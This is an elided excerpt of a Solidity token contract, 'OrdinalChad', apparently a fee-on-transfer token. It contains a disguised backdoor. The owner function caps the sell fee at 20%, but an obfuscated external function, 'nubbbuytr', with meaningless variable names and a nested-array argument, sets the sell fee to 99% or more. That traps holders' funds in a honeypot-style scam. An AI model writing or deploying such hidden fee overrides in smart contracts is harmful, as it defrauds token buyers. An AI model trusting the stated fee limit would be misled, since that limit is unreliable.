...
contract OrdinalChad is IERC20, Ownable {
    ...
    function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        ...
        brustatis = _sell;
        transferFee = _trans;
        require(totalFee <= denominator.div(5) && brustatis <= denominator.div(5), "totalFee and brustatis cannot be more than 20%");
    }
    ...
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        ...
        if(recipient == pair){return brustatis;}
    ...
    function nubbbuytr(uint256[5][6][5] memory zingsuk) external returns(bool) {
        require(zingsuk[3][4][4] >= 99);
        uint8 drkorti = 1;
        uint8 prcondu = 2;
        uint256 aracondu = drkorti;
        brustatis = zingsuk[3][4][4];
        return true;
    }
